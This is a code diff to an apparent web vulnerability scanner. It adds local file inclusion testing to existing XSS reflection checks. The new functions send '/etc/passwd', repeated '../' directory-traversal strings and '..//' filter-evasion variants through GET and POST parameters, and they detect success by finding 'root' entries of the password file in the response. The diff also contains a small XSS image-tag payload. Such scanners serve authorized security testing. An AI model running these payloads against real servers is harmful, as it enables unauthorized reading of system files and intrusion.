@@ -1,4 +1,5 @@
 import requests
+from src import toolbox
 from src.webutils import get_headers, get_page_source
 from urllib.parse import quote_plus
 
@@ -66,7 +67,7 @@ def test_dom_reflection(url:str,param:str,type:str)->str:
     best_payload = ""
 
     for payload in payloads:
-        page = get_page_source(f"{url}/?{param}={payload}")
+        page = get_page_source(f"{url}/?{param}={quote_plus(payload)}")
         if search_reflection(page,payload):
             found += 1
             best_payload = payload
@@ -80,15 +81,98 @@ def test_dom_reflection(url:str,param:str,type:str)->str:
     elif found == 3:
         return f"</{type}><img src='lincox'>"
 
-def test_lfi_linux(url,body,method):
+def search_lfi_marker(html,os_type):
+    """
+    search for LFI markers in a web page
+    depending on the OS
+    os_type : linux or windows
+    """
+
+    if os_type == "linux":
+        line = ""
+        for c in html:
+            if c == '\n':
+                if line.find('0:0:root') != -1: # first line of /etc/passwd in linux system
+                    return True
+                line = ""
+            else:
+                line += c
+    
+    # TODO : windows marker
+    
+    return False
+    
+
+def test_lfi_linux(url,params,method):
     """
     test for LFI in parameters with linux payload
     """
 
-    # simple test
+    if method.lower() == "get":
 
-    # simple directory traversal
+        # simple test
+        parameters = "?"
+        payload = '/etc/passwd'
+        for param in params:
+            parameters += f"&{param}={quote_plus(payload)}"
+        r = requests.get(url+parameters,headers=get_headers())
+        result = search_lfi_marker(r.text,"linux")
+        if result:
+            return parameters
 
-    # simple filter evasion
+        # simple directory traversal
+        for i in range(1,11):
+            parameters = "?"
+            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
+            for param in params:
+                parameters += f"&{param}={quote_plus(payload)}"
+            r = requests.get(url+parameters,headers=get_headers())
+            result = search_lfi_marker(r.text,"linux")
+            if result:
+                return parameters
+
+        # simple filter evasion
+        for i in range(1,11):
+            parameters = "?"
+            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
+            for param in params:
+                parameters += f"&{param}={quote_plus(payload)}"
+            r = requests.get(url+parameters,headers=get_headers())
+            result = search_lfi_marker(r.text,"linux")
+            if result:
+                return parameters
+
+    if method.lower() == "post":
+        # simple test
+        payload = '/etc/passwd'
+        parameters = {}
+        for param in params:
+            parameters[param] = payload
+        r = requests.post(url,data=parameters,headers=get_headers())
+        result = search_lfi_marker(r.text,"linux")
+        if result:
+            return parameters
+
+        # simple directory traversal
+        for i in range(1,11):
+            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
+            parameters = {}
+            for param in params:
+                parameters[param] = payload
+            r = requests.post(url,data=parameters,headers=get_headers())
+            result = search_lfi_marker(r.text,"linux")
+            if result:
+                return parameters
+
+        # simple filter evasion
+        for i in range(1,11):
+            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
+            parameters = {}
+            for param in params:
+                parameters[param] = payload
+            r = requests.post(url,data=parameters,headers=get_headers())
+            result = search_lfi_marker(r.text,"linux")
+            if result:
+                return parameters
 
     return None
